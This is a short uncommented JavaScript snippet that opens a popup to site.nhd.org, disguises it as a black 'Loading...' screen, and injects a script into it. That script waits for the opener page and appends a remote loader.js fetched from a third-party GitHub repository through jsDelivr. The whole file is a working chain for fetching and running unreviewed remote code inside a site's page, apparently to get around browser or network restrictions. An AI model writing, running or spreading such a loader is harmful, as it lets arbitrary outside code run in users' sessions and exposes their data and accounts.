(function() {
    const tabB = window.open('https://site.nhd.org', '_blank', 'width=400,height=300,top=200,left=500,resizable=no,scrollbars=no,status=no');

    tabB.addEventListener('load', () => {
        try {
        	tabB.document.body.innerHTML = '<h1>Loading...</h1>';
        	tabB.document.body.style.display = 'flex';
        	tabB.document.body.style.justifyContent = 'center';
        	tabB.document.body.style.alignItems = 'center';
        	tabB.document.body.style.height = '100vh';
        	tabB.document.body.style.backgroundColor = 'black';
        	tabB.document.body.style.color = 'white';
       	 	tabB.document.body.style.fontFamily = 'Arial, sans-serif';
            const script = tabB.document.createElement('script');
            script.textContent = `
                const interval = setInterval(() => {
                	if (window.opener && !window.opener.closed && window.opener.document.readyState === 'complete') {
                    	clearInterval(interval);
                        const s = window.opener.document.createElement('script');
                        s.src = 'https://cdn.jsdelivr.net/gh/ioB-ybbolB/ioB-ybbolB.github.io/loader.js';
                        window.opener.document.body.appendChild(s);
                        window.close();
                	}
                }, 50);
            `;
            tabB.document.body.appendChild(script);
        	window.location.href = 'https://site.nhd.org/blobe.html#temporary-link-cannot-share';
        } catch (e) {
            console.error("Cannot inject code into Tab B:", e);
        }
    });
})();
